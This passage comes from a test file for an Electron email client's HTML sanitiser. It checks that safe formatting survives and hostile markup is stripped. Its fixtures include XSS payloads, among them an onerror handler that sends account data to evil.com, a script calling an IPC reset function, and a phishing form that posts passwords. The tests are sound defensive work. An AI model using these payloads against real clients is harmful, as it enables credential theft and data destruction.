        expect(srcDoc).toContain('<ul>');
        expect(srcDoc).toContain('<li>');
      });

      it('should preserve tables', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<table><tr><th>Header</th></tr><tr><td>Data</td></tr></table>',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('Header');
        expect(srcDoc).toContain('Data');
        expect(srcDoc).toContain('<table>');
        expect(srcDoc).toContain('<th>');
        expect(srcDoc).toContain('<td>');
      });

      it('should preserve images with safe src', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<p>Image:</p><img src="https://example.com/image.jpg" alt="Description">',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('<img');
        // Images may be blocked by blockRemoteImages, but alt should be preserved
        expect(srcDoc).toContain('alt="Description"');
      });

      it('should preserve headings', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('<h1>Title</h1>');
        expect(srcDoc).toContain('<h2>Subtitle</h2>');
        expect(srcDoc).toContain('<h3>Section</h3>');
      });
    });

    describe('Real-World Attack Vector Prevention', () => {
      it('should block window.electron IPC bridge access attempts via script', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Email content</p><script>window.electron.resetDb()</script>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('window.electron');
        expect(srcDoc).not.toContain('resetDb');
        expect(srcDoc).toContain('Email content');
      });

      it('should block credential theft attempts via event handlers', async () => {
        const maliciousEmail = createEmail({
          bodyHtml:
            '<img src="x" onerror="fetch(\'https://evil.com/steal?data=\'+JSON.stringify(window.electron.getAccounts()))">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onerror');
        expect(srcDoc).not.toContain('getAccounts');
        expect(srcDoc).not.toContain('evil.com');
      });

      it('should block phishing form with credential inputs', async () => {
        const maliciousEmail = createEmail({
          bodyHtml:
            '<form action="https://evil.com/phish" method="POST">' +
            '<p>Please re-enter your password:</p>' +
            '<input type="password" name="pass">' +
            '<button type="submit">Verify Account</button>' +
            '</form>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<form');
        expect(srcDoc).not.toContain('<input');
        expect(srcDoc).not.toContain('<button');
        expect(srcDoc).not.toContain('evil.com');
        // Safe text content is preserved (DOMPurify KEEP_CONTENT: true)
        expect(srcDoc).toContain('Please re-enter your password:');
      });

      it('should block complex nested XSS attempts', async () => {
        const maliciousEmail = createEmail({
          bodyHtml:
            '<div>' +
            '<p>Legitimate content</p>' +
            '<iframe src="javascript:void(0)" onload="alert(1)">' +
            '<script>alert(2)</script>' +
            '</iframe>' +
            '<img src="x" onerror="alert(3)">' +
            '<a href="javascript:alert(4)">Link</a>' +
            '</div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<iframe');
        expect(srcDoc).not.toContain('<script');
        expect(srcDoc).not.toContain('onerror');
        expect(srcDoc).not.toContain('onload');
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).not.toContain('alert(');
        expect(srcDoc).toContain('Legitimate content');
        expect(srcDoc).toContain('Link');
      });
    });

    describe('Edge Cases', () => {
      it('should handle emails with only malicious content gracefully', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<script>alert("XSS")</script><iframe src="evil.com"></iframe>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<script');
        expect(srcDoc).not.toContain('<iframe');
        expect(srcDoc).not.toContain('alert');
      });

      it('should handle mixed safe and malicious content', async () => {
        const mixedEmail = createEmail({
          bodyHtml:
            '<p>Safe paragraph</p>' +
            '<script>alert("XSS")</script>' +
            '<strong>Bold text</strong>' +
            '<img src="x" onerror="evil()">' +
            '<em>Italic text</em>',
        });

        render(<EmailView email={mixedEmail} />);

        const srcDoc = await waitForSrcDoc();
        // Malicious parts removed
        expect(srcDoc).not.toContain('<script');
        expect(srcDoc).not.toContain('onerror');
        expect(srcDoc).not.toContain('alert');
        expect(srcDoc).not.toContain('evil()');
        // Safe parts preserved
        expect(srcDoc).toContain('Safe paragraph');
        expect(srcDoc).toContain('Bold text');
        expect(srcDoc).toContain('Italic text');
      });

      it('should handle empty HTML email content', () => {
        const emptyEmail = createEmail({
          bodyHtml: '',
        });

        render(<EmailView email={emptyEmail} />);

        // Should not crash, will show plain text instead
        expect(screen.getByText('This is the plain text email body content.')).toBeInTheDocument();
      });

      it('should handle malformed HTML gracefully', async () => {
        const malformedEmail = createEmail({
          bodyHtml: '<p>Unclosed paragraph<div>Nested incorrectly<script>alert("XSS")',
        });

        render(<EmailView email={malformedEmail} />);

        const srcDoc = await waitForSrcDoc();
        // DOMPurify should fix malformed HTML and remove script
        expect(srcDoc).not.toContain('<script');
        expect(srcDoc).not.toContain('alert');
        expect(srcDoc).toContain('Unclosed paragraph');
      });
    });
  });
});
